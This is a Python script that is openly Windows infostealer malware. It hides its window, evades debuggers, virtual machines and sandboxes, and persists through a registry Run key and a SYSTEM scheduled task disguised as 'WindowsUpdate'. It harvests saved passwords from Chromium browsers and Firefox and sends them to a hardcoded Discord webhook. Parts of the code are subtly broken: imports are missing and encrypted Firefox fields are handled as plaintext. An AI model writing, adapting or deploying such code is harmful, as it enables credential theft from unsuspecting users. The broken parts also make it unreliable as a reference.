import os
import sys
import time
import json
import sqlite3
import shutil
import subprocess
import winreg
import ctypes
import requests
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import win32crypt
from discord_webhook import DiscordWebhook

# Anti-debug: Check for debugger presence
def anti_debug():
    if sys.gettrace() is not None:
        sys.exit(0)
    try:
        import pydevd
        sys.exit(0)
    except:
        pass

# Anti-VM: Check common VM artifacts
def anti_vm():
    vm_indicators = [
        "VBoxGuest", "VMware", "VirtualBox", "QEMU", "Xen"
    ]
    for ind in vm_indicators:
        try:
            subprocess.check_output(f"wmic bios get manufacturer | findstr {ind}", shell=True)
            sys.exit(0)
        except:
            pass
    try:
        import win32com.client
        objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator").ConnectServer(".", "root\\cimv2")
        colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
        for objItem in colItems:
            if any(x in objItem.Model for x in ["Virtual", "VMware", "VBox"]):
                sys.exit(0)
    except:
        pass

# Anti-sandbox: Sleep and time check
def anti_sandbox():
    start = time.time()
    time.sleep(15)
    if time.time() - start < 12:
        sys.exit(0)

# Hide console window (Windows only)
def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Persistence via Registry and Scheduled Task
def persist():
    exe_path = os.path.abspath(sys.argv[0])
    # Registry
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
    except:
        pass
    # Scheduled Task (via schtasks)
    try:
        cmd = f'schtasks /create /tn "WindowsUpdate" /tr "{exe_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
        subprocess.run(cmd, shell=True, capture_output=True)
    except:
        pass

# Decrypt Chrome/Edge passwords (Chromium-based)
def get_chrome_datetime(chromedate):
    if chromedate:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    return None

def decrypt_chrome_password(encrypted_value):
    if encrypted_value is None:
        return None
    try:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def dump_chrome_browsers():
    local_appdata = os.getenv('LOCALAPPDATA')
    browsers = {
        'Chrome': os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        'Edge': os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        'Brave': os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
        'Opera': os.path.join(local_appdata, 'Opera Software', 'Opera Stable', 'Login Data'),
        'Vivaldi': os.path.join(local_appdata, 'Vivaldi', 'User Data', 'Default', 'Login Data')
    }
    results = {}
    for name, db_path in browsers.items():
        if os.path.exists(db_path):
            shutil.copy2(db_path, 'temp_login.db')
            conn = sqlite3.connect('temp_login.db')
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                url = row[0]
                username = row[1] if row[1] else ''
                password = decrypt_chrome_password(row[2]) if row[2] else ''
                if url and password:
                    results.setdefault(name, []).append((url, username, password))
            conn.close()
            os.remove('temp_login.db')
    return results

# Dump Firefox passwords (logins.json)
def dump_firefox():
    appdata = os.getenv('APPDATA')
    profiles_path = os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
    results = {}
    if os.path.exists(profiles_path):
        for profile in os.listdir(profiles_path):
            logins_path = os.path.join(profiles_path, profile, 'logins.json')
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        for entry in data.get('logins', []):
                            url = entry.get('hostname', '')
                            username = entry.get('username', '')
                            password = entry.get('password', '')
                            if url and password:
                                results.setdefault('Firefox', []).append((url, username, password))
                except:
                    pass
    return results

# Exfil via Discord webhook (clean TXT)
def exfiltrate(data_dict):
    content = ""
    for browser, entries in data_dict.items():
        content += f"\n=== {browser} ===\n"
        for url, user, pwd in entries:
            content += f"URL: {url}\nUser: {user}\nPass: {pwd}\n\n"
    if content.strip():
        webhook_url = "https://discord.com/api/webhooks/1517536993280790689/xBTguUDqlApa5KGuWB3KJNeQdD9qIYNAIYC8WnS6j1ATppPYCLoWysm1jKtQBIKg9oc4"
        webhook = DiscordWebhook(url=webhook_url, content=f"```txt\n{content.strip()}\n```")
        webhook.execute()

# Main stealth routine
def main():
    hide_console()
    anti_debug()
    anti_vm()
    anti_sandbox()
    persist()
    all_passwords = {}
    all_passwords.update(dump_chrome_browsers())
    all_passwords.update(dump_firefox())
    if all_passwords:
        exfiltrate(all_passwords)

if __name__ == "__main__":
    main()